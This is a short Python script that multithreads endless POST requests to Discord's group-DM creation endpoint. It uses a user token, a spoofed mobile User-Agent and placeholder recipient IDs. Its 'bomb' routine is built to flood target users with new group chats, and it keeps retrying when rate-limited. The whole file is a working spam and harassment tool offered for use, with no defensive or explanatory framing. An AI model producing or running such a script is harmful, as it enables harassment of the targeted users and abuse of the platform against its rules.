import requests
import colorama
import os
import threading
import logging

from colorama import Fore, init, Style
from threading import Thread
if os.name == "nt":
    os.system("cls")
else:
    os.system("clear")
logging.basicConfig(
    level=logging.INFO, 
    format="%(asctime)s %(message)s", 
    datefmt=f"{Fore.RED}{Style.BRIGHT}[{Fore.RESET}%I:%M:%S{Fore.RED}{Style.BRIGHT}]{Fore.RESET}"
)

class Main:
    def __init__(self):
        self.session = requests.Session()
        self.token = "TOKEN"
        self.threads = int(input(f'{Fore.RED}{Style.BRIGHT}[{Fore.RESET};{Fore.RED}{Style.BRIGHT}]{Fore.RESET} Threads{Fore.RED}{Style.BRIGHT}:{Fore.RESET} '))
        print()

    def bomb(self):
        while True:
            headers = {
                "Authorization": self.token,
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0 (Linux; Android 8.0.0;) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36"
            }
            json = {
                "recipients": ['USERID', 'USERID']
            }

            r = self.session.post('https://discordapp.com/api/v9/users/@me/channels', headers=headers, json=json)
            if r.status_code == 200:
                logging.info("Sent Request!")
            else:
                logging.info("Ratelimited")

    def start(self):
        while True:
            try:
                if threading.active_count() <= self.threads:
                    threading.Thread(target=self.bomb).start()
            except Exception:
                pass
            except KeyboardInterrupt:
                break

if __name__ == "__main__":
    Main().start()
